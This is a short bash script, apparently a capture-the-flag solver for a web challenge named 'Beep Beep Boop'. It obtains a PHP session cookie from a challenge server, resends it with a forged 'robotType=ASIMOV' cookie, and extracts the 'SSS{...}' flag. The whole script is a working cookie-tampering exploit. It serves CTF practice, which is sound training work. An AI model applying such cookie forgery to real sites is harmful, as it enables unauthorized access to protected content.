#!/bin/bash
PORT=8088

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.157:'$PORT
else
    url=$1':'$2
fi

# Beep Beep Boop
echo "Start exploit for Beep Beep Boop"
url=$url'/73656372657420666f72204153494d4f.php'
curl -s -c cookies.txt -o /dev/null $url
phpsessid=$(cat cookies.txt | grep PHPSESSID | awk '{print $7}')
flag=$(curl -s -b 'PHPSESSID='$phpsessid';robotType=ASIMOV' $url | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
